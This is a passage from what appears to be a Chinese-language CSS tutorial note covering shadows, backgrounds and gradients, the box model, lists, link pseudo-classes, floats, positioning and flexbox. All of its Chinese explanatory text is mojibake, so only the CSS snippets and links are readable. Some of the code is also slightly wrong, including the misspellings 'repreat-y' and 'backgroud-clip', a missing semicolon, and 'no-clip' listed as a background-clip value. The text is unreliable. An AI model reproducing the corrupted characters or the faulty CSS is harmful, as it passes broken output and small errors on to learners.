color;X-OffsetÔºöË°®Á§∫Èò¥ÂΩ±ÁöÑÊ∞¥Âπ≥ÂÅèÁßªË∑ùÁ¶ªÔºåÂÖ∂ÂÄº‰∏∫Ê≠£ÂÄºÊó∂Èò¥ÂΩ±ÂêëÂè≥ÂÅèÁßªÔºåÂèç‰πãÂêëÂ∑¶ÂÅèÁßªÔºõ Y-OffsetÔºöÊòØÊåáÈò¥ÂΩ±ÁöÑÂûÇÁõ¥ÂÅèÁßªË∑ùÁ¶ªÔºåÂ¶ÇÊûúÂÖ∂ÂÄºÊòØÊ≠£ÂÄºÊó∂ÔºåÈò¥ÂΩ±Âêë‰∏ãÂÅèÁßªÔºåÂèç‰πãÂêë‰∏äÂÅèÁßªÔºõ BlurÔºöÊòØÊåáÈò¥ÂΩ±ÁöÑÊ®°Á≥äÁ®ãÂ∫¶ÔºåÂÖ∂ÂÄº‰∏çËÉΩÊòØË¥üÂÄºÔºåÂ¶ÇÊûúÂÄºË∂äÂ§ßÔºåÈò¥ÂΩ±Ë∂äÊ®°Á≥äÔºåÂèç‰πãÈò¥ÂΩ±Ë∂äÊ∏ÖÊô∞ÔºåÂ¶ÇÊûú‰∏çÈúÄË¶ÅÈò¥ÂΩ±Ê®°Á≥äÂèØ‰ª•Â∞ÜBlurÂÄºËÆæÁΩÆ‰∏∫0Ôºõ ColorÔºöÊòØÊåáÈò¥ÂΩ±ÁöÑÈ¢úËâ≤ÔºåÂÖ∂ÂèØ‰ª•‰ΩøÁî®rgbaËâ≤„ÄÇdemo: text-shadow: 2px 2px 0 red ÊñáÊú¨ÂØπÈΩêtext-align: left | right | center | justifyÂàÜÂà´‰∏∫ÔºöÂ∑¶ÂØπÈΩêÊñáÊú¨ | Âè≥ÂØπÈΩê | Â±Ö‰∏≠ | ‰ΩøÊñáÊú¨Â±ïÂºÄÔºå‰ΩøË°åÂÆΩÁõ∏Âêå Ë°åË∑ùline-height: 1.5ÊîØÊåÅÂ§ßÂ§öÊï∞Âçï‰ΩçÔºå‰πüÂèØ‰ª•Êó†Âçï‰ΩçÔºå‰Ωú‰∏∫‰πòÊï∞Ôºå‰πò‰ª•font-size„ÄÇ‰∏ÄËà¨ËÆæÁΩÆ‰∏∫ÁõíÂ≠êÊ®°ÂûãÁöÑheightÂÄºÔºåÂèØ‰ª•Ëµ∑Âà∞ÂûÇÁõ¥Â±Ö‰∏≠‰ΩúÁî®„ÄÇ ÂçïËØçÂíåÂ≠óÊØçÈó¥Ë∑ùletter-spacing:word-spacing: Áº©Ëøõtext-indent:2emÁªôÊÆµËêΩÂºÄÂ§¥Áº©Ëøõ2emÔºåÂç≥‰∏§‰∏™ÊñáÂ≠óÁöÑÁ©∫ÁôΩ Ë°åÈó¥Ë∑ùline-height: 1.5em Â≠óÈó¥Ë∑ùletter-spacing: 50px (ÊÆµËêΩ)ÂØπÈΩêtext-align: center Áº©ÂÜôÔºö12345678910111213body&#123; font-style:italic; font-variant:small-caps; font-weight:bold; font-size:12px; line-height:1.5em; font-family:&quot;ÂÆã‰Ωì&quot;,sans-serif;&#125;Áº©ÂÜô‰∏∫Ôºöbody&#123; font:italic small-caps bold 12px/1.5em &quot;ÂÆã‰Ωì&quot;,sans-serif;&#125; textareaÊ†áÁ≠æÁõ∏ÂÖ≥Â±ûÊÄß ÊéßÂà∂ÂÖÉÁ¥†Â§ßÂ∞èÂèØË∞ÉÊï¥ÊÄßÔºöresize123456789101112/* Keyword values */resize: none; /*ÈªòËÆ§*/resize: both;resize: horizontal;resize: vertical;resize: block;resize: inline;/* Global values */resize: inherit;resize: initial;resize: unset; ËÉåÊôØ Âü∫Êú¨ÂÜÖÂÆπbackground ËÉåÊôØËâ≤: background-color: red ËÉåÊôØÂõæÂÉèÔºöbackground-image: url(https://img) ËÉåÊôØÈáçÂ§çÔºöbackground-repeat: no-repeat | repeat-x | repreat-y | repeatÊïàÊûúÂàÜÂà´‰∏∫Ôºå‰∏çÈáçÂ§ç | Ê∞¥Âπ≥ÈáçÂ§ç | ÂûÇÁõ¥ÈáçÂ§ç | ÈÉΩÈáçÂ§ç ËÉåÊôØ‰ΩçÁΩÆÔºöbackground-position: px | rems | % | center | left | right | top | bottom Ê∏êÂèòÔºöbackground-imagebackground-image: linear-gradient(to bottom, yellow, orange 40%, yellow)‰ΩøÁî®Ê∏êÂèòÂáΩÊï∞:linear-gradient()‰º†ÂÖ•Ê∏êÂèòÊñπÂêë(to bottom | to right | to bottom rightÁ≠â), Ê∏êÂèòËâ≤„ÄÇ ÈáçÂ§çÊ∏êÂèòbackground-image: repeating-linear-gradient(to right, yellow, orange 25px, yellow 50px);0-&gt;50%Ôºå50%-&gt;100%Âë®ÊúüÊ∏êÂèò ËÉåÊôØÈôÑÁùÄÔºöbackground-attachment: scroll | fixed | localÂÜÖÂÆπÊªöÂä®Êó∂ÔºåËÉåÊôØÊòæÁ§∫ÁöÑÊïàÊûú„ÄÇdemo:https://github.com/mdn/learning-area/tree/master/css/styling-boxes/backgrounds ÁÆÄÂÜôÔºöbackground: yellow linear-gradient(to bottom, orange, yellow) no-repeat left center scroll; ËÉåÊôØÂ§ßÂ∞è: background-sizebackground-size: auto | &lt;ÈïøÂ∫¶ÂÄº&gt; | &lt;ÁôæÂàÜÊØî&gt; | cover | contain autoÔºöÈªòËÆ§ÂÄºÔºå‰∏çÊîπÂèòËÉåÊôØÂõæÁâáÁöÑÂéüÂßãÈ´òÂ∫¶ÂíåÂÆΩÂ∫¶Ôºõ&lt;ÈïøÂ∫¶ÂÄº&gt;ÔºöÊàêÂØπÂá∫Áé∞Â¶Ç200px 50pxÔºåÂ∞ÜËÉåÊôØÂõæÁâáÂÆΩÈ´ò‰æùÊ¨°ËÆæÁΩÆ‰∏∫ÂâçÈù¢‰∏§‰∏™ÂÄºÔºåÂΩìËÆæÁΩÆ‰∏Ä‰∏™ÂÄºÊó∂ÔºåÂ∞ÜÂÖ∂‰Ωú‰∏∫ÂõæÁâáÂÆΩÂ∫¶ÂÄºÊù•Á≠âÊØîÁº©ÊîæÔºõ &lt;ÁôæÂàÜÊØî&gt;Ôºö0ÔºÖ~100ÔºÖ‰πãÈó¥ÁöÑ‰ªª‰ΩïÂÄºÔºåÂ∞ÜËÉåÊôØÂõæÁâáÂÆΩÈ´ò‰æùÊ¨°ËÆæÁΩÆ‰∏∫ÊâÄÂú®ÂÖÉÁ¥†ÂÆΩÈ´ò‰πò‰ª•ÂâçÈù¢ÁôæÂàÜÊØîÂæóÂá∫ÁöÑÊï∞ÂÄºÔºåÂΩìËÆæÁΩÆ‰∏Ä‰∏™ÂÄºÊó∂Âêå‰∏äÔºõ coverÔºöÈ°æÂêçÊÄù‰πâ‰∏∫Ë¶ÜÁõñÔºåÂç≥Â∞ÜËÉåÊôØÂõæÁâáÁ≠âÊØîÁº©Êîæ‰ª•Â°´Êª°Êï¥‰∏™ÂÆπÂô®Ôºõ containÔºöÂÆπÁ∫≥ÔºåÂç≥Â∞ÜËÉåÊôØÂõæÁâáÁ≠âÊØîÁº©ÊîæËá≥Êüê‰∏ÄËæπÁ¥ßË¥¥ÂÆπÂô®ËæπÁºò‰∏∫Ê≠¢„ÄÇ ËÉåÊôØÊ∫êÔºöbackground-originbackground-origin: border-box | padding-box | content-box;ÂèÇÊï∞ÂàÜÂà´Ë°®Á§∫ËÉåÊôØÂõæÁâáÊòØ‰ªéËæπÊ°ÜÔºåËøòÊòØÂÜÖËæπË∑ùÔºàÈªòËÆ§ÂÄºÔºâÔºåÊàñËÄÖÊòØÂÜÖÂÆπÂå∫ÂüüÂºÄÂßãÊòæÁ§∫„ÄÇ ËÉåÊôØÂâ™ÂàáÔºö background-clipbackground-clip Ôºö border-box | padding-box | content-box | no-clipÂèÇÊï∞ÂàÜÂà´Ë°®Á§∫‰ªéËæπÊ°Ü„ÄÅÊàñÂÜÖÂ°´ÂÖÖÔºåÊàñËÄÖÂÜÖÂÆπÂå∫ÂüüÂêëÂ§ñË£ÅÂâ™ËÉåÊôØ„ÄÇno-clipË°®Á§∫‰∏çË£ÅÂàáÔºåÂíåÂèÇÊï∞border-boxÊòæÁ§∫ÂêåÊ†∑ÁöÑÊïàÊûú„ÄÇbackgroud-clipÈªòËÆ§ÂÄº‰∏∫border-box„ÄÇ Â¶ÇÊûúË¶ÅÂâ™ÂàáÊàêÂúÜÂΩ¢ÔºåÂàôÂÜô‰∏Ä‰∏™ border-radius,ÁÑ∂ÂêéÂú®Ëøô‰∏™ÁõíÂ≠ê‰∏≠Ëµã‰∏Ä‰∏™ËÉåÊôØÂõæÂç≥ÂèØ„ÄÇ ÁõíÂ≠êÊ®°ÂûãÂùóÁä∂Ê®°ÂûãÈÉΩÂÖ∑Â§áÁõíÂ≠êÊ®°ÂûãÁöÑÁâπÂæÅ ÁõíÂ≠êÊ®°ÂûãËæπÊ°ÜÁ≤óÁªÜÔºöborder-width: 2pxÊ†∑ÂºèÔºöborder-style:solid,Â∏∏ËßÅÁöÑÂÄºÊúâ: dashed (ËôöÁ∫ø)|dotted(ÁÇπÁ∫ø)|solid(ÂÆûÁ∫ø)È¢úËâ≤Ôºöborder-color: red ÂèØ‰ª•ÁÆÄÂÜô‰∏∫Ôºöborder: 2px solid redÂ¶ÇÊûúÂè™ÊÉ≥ËÆæÁΩÆÂ∫ïËæπÔºöborder-bottom: 2px solid redÔºåÂÖ∂‰ªñËæπÂêåÁêÜÔºöborder-top | border-right | border-left ËæπÊ°ÜÂúÜËßíborder-radius:10px;border-radius: 5px 4px 3px 2px; /*Âõõ‰∏™ÂçäÂæÑÂÄºÂàÜÂà´ÊòØÂ∑¶‰∏äËßí„ÄÅÂè≥‰∏äËßí„ÄÅÂè≥‰∏ãËßíÂíåÂ∑¶‰∏ãËßíÔºåÈ°∫Êó∂Èíà */ demo:ÂçäÂúÜ1234567div.circle&#123; height:50px width:100px; background:#9da; border-radius:50px 50px 0 0 ; &#125;&lt;div class=&quot;circle&quot;&gt;&lt;/div&gt; ËæπÊ°ÜÈò¥ÂΩ±(box-shadow)box-shadow: XËΩ¥ÂÅèÁßªÈáè YËΩ¥ÂÅèÁßªÈáè [Èò¥ÂΩ±Ê®°Á≥äÂçäÂæÑ] [Èò¥ÂΩ±Êâ©Â±ïÂçäÂæÑ] [Èò¥ÂΩ±È¢úËâ≤] [ÊäïÂΩ±ÊñπÂºè]; ‰∏çÂêåÊµèËßàÂô®ÈÄÇÈÖçÔºö123 -webkit-box-shadow:;-moz-box-shadow:;box-shadow:; ÁõíÂ≠êÊ®°ÂûãÂÆΩÂíåÈ´òÂá†‰∏™ÂÖ≥ÈîÆÂèÇÊï∞Ôºö ÂÆΩÔºöwidth Â°´ÂÖÖÔºöpadding ËæπÊ°ÜÔºöborder ËæπÁïåÔºömargin ÂêåÊ†∑‰πüÂèØ‰ª•ËÆæÁΩÆÈ°∂Â∫ïÂ∑¶Âè≥ÁöÑË∑ùÁ¶ª,Â¶ÇÔºöpadding-topÁ≠âÁ≠â,ÁÆÄÂÜôÔºötop„ÄÅright„ÄÅbottom„ÄÅleftÂÄºÁõ∏ÂêåÔºömargin:10px 10px 10px 10px; =&gt;margin: 10pxtopÂíåbottomÔºåleftÂíårightÁõ∏Âêå:margin:10px 20px 10px 20px;=&gt;margin:10px 20px; Â¶ÇÊûúleftÂíårightÁõ∏ÂêåÔºömargin:10px 20px 30px 20px;ÂèØÁº©ÂÜô‰∏∫Ôºömargin:10px 20px 30px; Ê∫¢ÊµÅ:overflow: auto | hidden | visible auto: Ê∫¢Âá∫ÁõíÂ≠êÁöÑÂÜÖÂÆπÂ∞ÜË¢´ÈöêËóèÔºåÂá∫Áé∞ÊªöÂä®Êù° hidden: Ê∫¢Âá∫ÁöÑÂÜÖÂÆπÈöêËóè visible: Ê∫¢Âá∫ÁöÑÂÜÖÂÆπÊòæÁ§∫Âú®ÁõíÂ≠êÂ§ñËæπ ËΩÆÂªìÔºöOutline ÁõíÂ≠êÊ®°ÂûãÔºöbox-sizingbox-sizing: content-box | border-box | inheritËÆæÁΩÆÊàêborder-boxÂêéÔºåÂç≥marginÔºåpaddingËøô‰∫õ‰∏ç‰ºöÂÜçÂΩ±ÂìçwidthÂíåheightÁöÑÊÄªÈïø„ÄÇ ÁõíÂ≠êÂÖÉÁ¥†Á±ªÂûãËΩ¨Êç¢ËΩ¨Êç¢‰∏∫ÂÜÖËÅîÂÖÉÁ¥†Ôºödisplay:inlineËΩ¨Âåñ‰∏∫ÂùóÁä∂ÂÖÉÁ¥†Ôºödisplay:blockËΩ¨Âåñ‰∏∫ÂÜÖËÅîÂùóÁä∂ÂÖÉÁ¥†Ôºödisplay: inline-block ËøòÊúâ‰∏Ä‰∫õÂÖ∂‰ªñÁöÑÊòæÁ§∫Á±ªÂûãÔºö display: table: ÂèØ‰ª•ÂÉèÂ§ÑÁêÜtableÂ∏ÉÂ±ÄÂì™Ê†∑Â§ÑÁêÜÈùûtableÂÖÉÁ¥†„ÄÇ display: flexÔºöÂèØ‰ª•Â∏ÉÁΩÆ‰∏Ä‰∫õÂºπÊÄßÁ≠âÂÆΩÂÆπÂô®ÔºåÊàñËÄÖÂûÇÁõ¥Â±Ö‰∏≠ÂÜÖÂÆπÁ≠â display: gridÔºöcssÁΩëÊ†º„ÄÇ ÁõíÂ≠êÂÆΩÂíåÈ´òÁöÑÁ∫¶Êùü demo: Áà∂ÂÆπÂô®Âú®ÊúÄÂ§ßÂíåÊúÄÂ∞èÁöÑÈôêÂà∂ÂÜÖÔºåÂÆÉÂ∞ÜÂ°´Êª°Êï¥‰∏™ËßÜÂõæÔºåÁà∂Â∞è‰∫é1280pxÔºåÂ∏ÉÂ±Ä‰øùÊåÅ1280pxÔºåÂ∞è‰∫é480pxÔºåÂàôÊªöÂä®ÊâçËÉΩÁúãÂà∞ÂÖ®ÈÉ®ÂÜÖÂÆπ„ÄÇ1234width: 70%max-width: 1280px;min-width: 480px;margin: 0 auto; /*Âú®Áà∂ÂÆπÂô®‰∏≠‰∏ä‰∏ãËæπË∑ù‰∏∫0ÔºåÂ∑¶Âè≥Â±Ö‰∏≠*/ demo2: Â∞ÜÂõæÂÉè/ËßÜÈ¢ëÔºåÈôêÂà∂Âú®ÂÆπÂô®ÂÜÖÈÉ®123display: block;margin: 0 auto;max-width: 100%; /*Áà∂ÂÆπÂô®Áº©Â∞èÂà∞Â∞è‰∫éÂõæÂÉèÂÆΩÂ∫¶ÔºåÂõæÂÉè‰ºö‰∏ÄËµ∑Áº©Â∞è*/ Ê†∑ÂºèÂàóË°® ÂàóË°®ÁâπÂÆöÊ†∑Âºè‰ΩúÁî®Âú®&lt;ul&gt;Âíå&lt;ol&gt;ÂÖÉÁ¥†‰∏äÔºö ÂàóË°®È°πÁõÆÁ¨¶Âè∑ÁöÑÁ±ªÂûãÔºölist-style-type: upper-roman | none | square (Â§ßÂÜôÁöÑÁΩóÈ©¨Â≠óÔºåÊàñËÄÖÊñπÂΩ¢Á¨¶Âè∑,ÊàñËÄÖÊ≤°Êúâ) Á¨¶Âè∑Âú®ÂàóË°®È°πÂÜÖËøòÊòØÂ§ñÔºö list-style-position: inside | outside(ÈªòËÆ§) È°πÁõÆÁ¨¶Âè∑Ëá™ÂÆö‰πâÂõæÁâáÔºölist-style-image: url(star.svg) ÁÆÄÂÜôÔºölist-style: square url() inside; ÁÆ°ÁêÜÂàóË°®ËÆ°Êï∞ startÔºö‰ªé1‰ª•Â§ñÁöÑÊï∞Â≠óÂºÄÂßãËÆ°Êï∞demo: ‰ªé4ÂºÄÂßãËÆ°Êï∞ 123456&lt;ol start=&quot;4&quot;&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;li&gt;6&lt;/li&gt; &lt;li&gt;7&lt;/li&gt;&lt;/ol&gt; reversed: ÂàóË°®ÂÄíËÆ°Êï∞ 1234&lt;ol start=&quot;4&quot; reversed&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;3&lt;/li&gt;&lt;/ol&gt; value: ËÆæÁΩÆÂàóË°®È°πÊåáÂÆöÊï∞ÂÄº 1234&lt;ol&gt; &lt;li value=&quot;2&quot;&gt;2&lt;/li&gt; &lt;li value=&quot;10&quot;&gt;10&lt;/li&gt;&lt;/ol&gt; ÈìæÊé• ÈìæÊé•Áä∂ÊÄÅÊØè‰∏Ä‰∏™Áä∂ÊÄÅÈÉΩÂØπÂ∫îÁöÑ‰º™Á±ªÊù•Â∫îÁî®Ê†∑Âºè Link(Êú™ËÆøÈóÆËøáÁöÑ): ÈªòËÆ§ÔºåÂèØ‰ª•‰ΩøÁî®:linkÊù•Â∫îÁî®Ê†∑Âºè Visited:Â∑≤ÁªèË¢´ËÆøÈóÆËøáÁöÑÔºåÂêåÁêÜÂèØ‰ª•Áî®:Visited‰º™Á±ªÊù•Â∫îÁî®Ê†∑Âºè HoverÔºöÈº†Ê†áÂÅúÁïôÂú®ÈìæÊé•‰∏ä FocusÔºöË¢´ÈÄâ‰∏≠(Â¶ÇÈÄöËøátabÁßªÂä®Âà∞Ëøô‰∏™ÈìæÊé•)Êó∂ ActiveÔºöË¢´ÊøÄÊ¥ªÁöÑÊó∂ÂÄô(Ë¢´ÁÇπÂáª)„ÄÇ ‰ΩøÁî®ÁöÑÈ°∫Â∫èÊòØ‰ªé‰∏äÂà∞‰∏ãÁöÑÔºåÂõ†‰∏∫ÂΩìÈìæÊé•Ë¢´ÊøÄÊ¥ªÁöÑÊó∂ÂÄôÊòØÈÄâ‰∏≠Áä∂ÊÄÅÁöÑ„ÄÇ ÈìæÊé•‰∏≠ÂåÖÂê´ÂõæÊ†áÊÄùË∑ØÂíå‰πãÂâçÁöÑÂ∞ÜÂàóË°®ÁöÑÂéüÁÇπÊõøÊç¢ÊàêÂõæÁâáÊÄùË∑Ø‰∏ÄÊ†∑ÔºåÂºïÂÖ•ËÉåÊôØÂõæÊ†áÔºåÂ∞ÜËÉåÊôØÁöÑ‰ΩçÁΩÆËÆæ‰∏∫100% 0Âè≥‰∏äËßíÔºåËÆæÁΩÆËÉåÊôØÁöÑÂ§ßÂ∞èÔºåÁÑ∂ÂêéÂ∞ÜÊñáÂ≠óÂè≥Â°´ÂÖÖpadding-right:ËÆæÊàêÊØîËÉåÊôØÂ§ß‰∏ÄÁÇπÂç≥ÂèØ„ÄÇ demo:123456a[href*=&quot;http&quot;]&#123; background: no-repeat url(&apos;https://mdn.mozillademos.org/files/12982/external-link-52.png&apos;) 100% 0; background-size: 1rem; padding-right:1.2rem; &#125; ÊµÆÂä®Â∏ÉÂ±ÄËÆ©‰∏§ÂùóÁä∂ÂÖÉÁ¥†(ÈªòËÆ§Êç¢Ë°å)Âπ∂ÊéíÊòæÁ§∫(ÊµÆÂä®ÊïàÊûú)Ôºöfloat:left | right‰∏ÄËà¨Â∫îÁî®‰∫éÈ¶ñÂ≠ó‰∏ãÊ≤âÔºåÊàñËÄÖÂõæÁâáË¢´ÊñáÂ≠óÁéØÁªïÁöÑÊÉÖÊôØÔºåÂ§öÂàóÊµÆÂä®Â∏ÉÂ±Ädemo:123456789101112131415161718192021body &#123; width: 90%; max-width: 900px; margin: 0 auto;&#125;div:nth-of-type(1) &#123; width: 36%; float: left;&#125;div:nth-of-type(2) &#123; width: 30%; float: left; margin-left: 4%;&#125;div:nth-of-type(3) &#123; width: 26%; float: right;&#125; Ê∏ÖÈô§ÊµÆÂä®clear: left | right | bothÊ∏ÖÈô§Â∑¶|Âè≥|ÂÖ®ÈÉ®ÊµÆÂä®Ôºå‰∏ÄËà¨Âá∫Áé∞Âú®ÊµÆÂä®ÂÖÉÁ¥†‰∏ãÊñπÁöÑÂÖÉÁ¥†ÈúÄË¶ÅÊ∏ÖÈô§„ÄÇ Ê∏ÖÈô§ÊµÆÂä®ÁöÑÂè¶‰∏ÄÁßçÊñπÊ≥ïËÆæÁΩÆÂÖÉÁ¥†Ê∫¢Âá∫Êó∂Â§ÑÁêÜÊñπÊ°àÔºöoverflow: auto; Â∏ÉÂ±ÄÔºöÂÆö‰Ωç ÁªùÂØπÂÆö‰Ωç(position: absolute)ËÆæÁΩÆposition: absoluteÂêéÔºåÁÑ∂Âêé‰ΩøÁî®left | right | top | bottomÂØπ‰∫éÂÖ∂ÊúÄËøëÁöÑ‰∏Ä‰∏™ÂÖ∑ÊúâÂÆö‰ΩçÂ±ûÊÄßÁöÑÁà∂ÂåÖÂê´ÂùóËøõË°åÁªùÂØπÂÆö‰Ωç(Ê≤°ÊúâÂàôÈÄâÊã©bodyÂÖÉÁ¥†ÔºåÂç≥ÊµèËßàÂô®Á™óÂè£)demo: 12345div&#123; position: absolute; left:100px; top:200px;&#125; Áõ∏ÂØπÂÆö‰Ωç(position: relative)ÂêåÊ†∑ËÆæÁΩÆÂ•Ωposition: relative‰πãÂêéÔºå‰ΩøÁî®left|right|top|bottomÁõ∏ÂØπ‰∫éÂéüÊù•‰ΩçÁΩÆÁßªÂä® Âõ∫ÂÆöÂÆö‰Ωç(position: fixed)ËÆæÁΩÆposition: fixedÔºå‰ΩøÁî®left|right|top|bottomÔºåÊïàÊûúÂíåÁªùÂØπÂÆö‰ΩçÁ±ª‰ººÔºå‰ªñÊòØÁõ∏ÂØπ‰∫éÂ±èÂπïÂõ∫ÂÆöÁöÑÔºå‰∏ç‰ºöÈöèÁùÄÊµèËßàÂô®ÊªöÂä®Êù°ÂèòÂä®Ôºå‰πü‰∏ç‰ºöÂõ†‰∏∫Á™óÂè£ÁöÑÊîæÂ§ßÊàñÁº©Â∞èËÄåÂä®ÊÄÅÂèòÂåñ„ÄÇ ÂèØ‰ª•ÁªôÂØºËà™Ê†èÁî® RelativeÂíåAbsoluteÁªÑÂêà‰ΩøÁî®Áõ∏ÂØπÂÖ∂‰ªñÂÖÉÁ¥†ËøõË°åÂÆö‰Ωç„ÄÇÂèÇÁÖßÂÆö‰ΩçÂÖÉÁ¥†:position: relativeÁõ∏ÂØπÂÆö‰ΩçÂÖÉÁ¥†:position: absolute‰πãÂêéÂç≥ÂèØ‰ª•‰ΩøÁî®left„ÄÅtopÁ≠âÁÜüÊÇâËøõË°åÂÅèÁßª‰∫Ü„ÄÇ ÈáçÂè†Ôºöz-indexËÆæÁΩÆÂõæÂ±Ç‰ΩçÁΩÆÔºå‰πüÂ∞±ÊòØË∞ÅÂú®‰∏äË∞ÅÂú®‰∏ã Âç≥‰ª•zËΩ¥‰ΩúÂèÇËÄÉÔºåÊï∞ÂÄºÂ§ßÁöÑÂú®‰∏äÂ±Çdemo:z-index:-1 ÂºπÊÄßÁõíÂ≠êÂ∏ÉÂ±ÄÁªßcssÂ∏ÉÂ±ÄÂ∑•ÂÖ∑Âè™ÊúâfloatÂíåposition‰ª•Êù•ÔºåflexÂÆûÁé∞‰∫Ü‰∏Ä‰∫õÂÆÉ‰ª¨Èöæ‰ª•ÂÆûÁé∞ÁöÑÂäüËÉΩ„ÄÇ flexÊ®°ÂûãËØ¥Êòé ‰∏ªËΩ¥Ôºàmain axisÔºâÊòØÊ≤øÁùÄ flex ÂÖÉÁ¥†ÊîæÁΩÆÁöÑÊñπÂêëÂª∂‰º∏ÁöÑËΩ¥ÔºàÊØîÂ¶ÇÈ°µÈù¢‰∏äÁöÑÊ®™ÂêëÁöÑË°å„ÄÅÁ∫µÂêëÁöÑÂàóÔºâ„ÄÇËØ•ËΩ¥ÁöÑÂºÄÂßãÂíåÁªìÊùüË¢´Áß∞‰∏∫ main start Âíå main end„ÄÇ ‰∫§ÂèâËΩ¥Ôºàcross axisÔºâÊòØÂûÇÁõ¥‰∫é flex ÂÖÉÁ¥†ÊîæÁΩÆÊñπÂêëÁöÑËΩ¥„ÄÇËØ•ËΩ¥ÁöÑÂºÄÂßãÂíåÁªìÊùüË¢´Áß∞‰∏∫ cross start Âíå cross end„ÄÇ ËÆæÁΩÆ‰∫Ü display: flex ÁöÑÁà∂ÂÖÉÁ¥†ÔºàÂú®Êú¨‰æã‰∏≠ÊòØ ÔºâË¢´Áß∞‰πã‰∏∫ flex ÂÆπÂô®Ôºàflex containerÔºâ„ÄÇ Âú® flex ÂÆπÂô®‰∏≠Ë°®Áé∞‰∏∫ÊüîÊÄßÁöÑÁõíÂ≠êÁöÑÂÖÉÁ¥†Ë¢´Áß∞‰πã‰∏∫ flex È°πÔºàflex itemÔºâÔºàÊú¨‰æã‰∏≠ÊòØ ÂÖÉÁ¥† ËÆæÁΩÆÂºπÊÄßÁõíÂ≠êdisplay: flex ËÆæÁΩÆÂ±ïÁ§∫ÊñπÂêëflex-direction: row | row-reverse | column | column-reverse ÈªòËÆ§‰∏∫rowÔºåÂç≥ÊéíÂàóÊàê‰∏ÄË°åÔºåÂä†‰∫ÜreverseÂç≥ÂÖÉÁ¥†È°∫Â∫èÂÄíÂ∫è„ÄÇ Êç¢Ë°åflex-wrap: wrap | nowrapÈªòËÆ§ÂÄº‰∏∫:nowrapÔºåÂç≥‰∏çÊç¢Ë°ådemo:ÂÖÉÁ¥†Ê∫¢Âá∫Êó∂Êç¢Ë°åËÆæÁΩÆÊç¢Ë°åÔºöflex-wrap: wrap flex-flowÁº©ÂÜô(‰∏äËø∞‰∏§‰∏™ÂèÇÊï∞) 12flex-direction: row;flex-wrap: wrap; -&gt;flex-flow: row wrap Âä®ÊÄÅÂ∞∫ÂØ∏flex: &lt;number&gt;; demo:flexÂºπÊÄßÁõíÂ≠ê‰∏≠‰∏â‰∏™articleÁõíÂ≠êÂÆΩ(È´ò)Â∫¶ÊØî‰æã‰∏∫1:2:3123456789article:nth-of-type(1)&#123; flex: 1;&#125;article:nth-of-type(2)&#123; flex: 2;&#125;article:nth-of-type(3)&#123; flex: 3; &#125; demo2ÔºöËøòÂèØ‰ª•ÊåáÂÆöÊúÄÂ∞èÂÄºÔºåÊØè‰∏™ÁõíÂ≠êÂàÜÈÖçÂÆå100pxÂêéÔºåÊé•ÁùÄÊåâÊØî‰æãÂ∞ÜÂâ©‰ΩôÁ©∫Èó¥ÂàÜÈÖç123456789article:nth-of-type(1)&#123; flex: 1 100px;&#125;article:nth-of-type(2)&#123; flex: 2 100px;&#125;article:nth-of-type(3)&#123; flex: 3 100px;&#125; ÂûÇÁõ¥ÂØπÈΩê ÊéßÂà∂flexÂú®‰∫§ÂèâËΩ¥(Á∫µËΩ¥)ÁöÑ‰ΩçÁΩÆalign-items: stretch | center | start | endstretchÔºöÈªòËÆ§ÂÄºÔºåÂú®‰∫§ÂèâËΩ¥ÊñπÂêëÊãâ‰º∏Ôºå‰ª•Â°´ÂÖÖÁà∂ÂÆπÂô®ÔºåÂ¶ÇÊûúÁà∂ÂÆπÂô®Âú®‰∫§ÂèâËΩ¥Ê≤°ÊúâÂõ∫ÂÆöÁöÑÈ´òÂ∫¶ÔºåÂàôÂíåÊúÄÈïøÁöÑflexÈ°πÈ´òÂ∫¶‰øùÊåÅ‰∏ÄËá¥ demo:https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-items align-self: flex-start | flex-end ÂèØ‰ª•Ë¶ÜÁõñalign-itemsÁöÑÊïàÊûú demo: 123 button:first-child &#123; align-self: flex-end;&#125; Ê∞¥Âπ≥ÂØπÈΩêjustify-content: center | start | end | flex-start | flex-end | space-between | space-around | space-evenlyÁ≠âÁ≠â flex-startÔºö‰ªéË°åÈ¶ñËµ∑Âßã‰ΩçÁΩÆÂºÄÂßãÊéíÂàó startÔºö ‰ªé‰∏ªËΩ¥ÂºÄÂßãÊéíÂàó space-between: ÂùáÂåÄÊéíÂàóÂÖÉÁ¥†ÔºåÈ¶ñ‰∏™ÂÖÉÁ¥†ÊîæÁΩÆ‰∫éËµ∑ÁÇπÔºåÊú´Â∞æÂÖÉÁ¥†ÊîæÁΩÆ‰∫éÁªàÁÇπ space-aroundÔºö ÂùáÂåÄÊéíÂàóÊØè‰∏™ÂÖÉÁ¥†ÔºåÊØè‰∏™ÂÖÉÁ¥†Âë®Âõ¥ÂàÜÈÖçÁõ∏ÂêåÁöÑÁ©∫Èó¥ space-evenly; ÂùáÂåÄÊéíÂàóÊØè‰∏™ÂÖÉÁ¥†ÔºåÊØè‰∏™ÂÖÉÁ¥†‰πãÈó¥ÁöÑÈó¥ÈöîÁõ∏Á≠â ÂÖ®ÈÉ®ÂèÇÊï∞Ôºöhttps://developer.mozilla.org/zh-CN/docs/Web/CSS/justify-content flexÈ°πÊéíÂ∫èorder: &lt;number&gt;;ÔºöÊï∞ÂÄºË∂äÂ§ßÁöÑÂú®Ë∂äÂêéÈù¢ demo:Â∞ÜÁ¨¨‰∏Ä‰∏™ÊåâÈíÆÊîæÊúÄÂêéÔºåÂêéËæπÁöÑ‰ª•Ê≠§ÂæÄÂâçÁßªÂä®123button:first-child&#123; order: 1;&#125; flex ÂµåÂ•óÂèØ‰ª•‰∏∫flexÈ°πÁõÆÁöÑÂ≠©Â≠êËÆæÁΩÆdisplay:flex‰Ωø‰πãË°®Áé∞‰∏∫flexible box Áº©ÂÜôËØ≠Ê≥ïËßÑÂàôÔºöhttps://developer.mozilla.org/zh-CN/docs/Web/CSS/flex flex Áº©ÂÜôflex: 0 0 200px; ÂèÇÊï∞1Ôºöflex-growÔºåËØ•ÂÄºË°®Á§∫ÂíåÂÖ∂‰ªñflexÁõíÂ≠êÊàêÁöÑÊØî‰æãÂÖ≥Á≥ª ÂèÇÊï∞2Ôºöflex-shrink, ÈªòËÆ§ÂÆΩÂ∫¶Â§ß‰∫éÂÆπÂô®Êó∂ÁöÑ‰∏Ä‰∏™Êî∂Áº©ËßÑÂàôÔºå‰πüÊòØÊØî‰æãÂÖ≥Á≥ª„ÄÇ ÂèÇÊï∞3Ôºöflex-basis, 